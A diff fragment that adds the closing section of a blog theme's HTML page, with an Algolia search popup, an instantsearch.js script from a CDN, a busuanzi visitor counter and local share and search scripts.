+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+        <div class="site-search">
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="iconfont-archer">&#xe609;</i>
+    </span>
+  </div>
+</div>
+        <script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.8.0/dist/instantsearch.min.js" defer></script>
+        <script src="/scripts/search.js" defer></script>
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
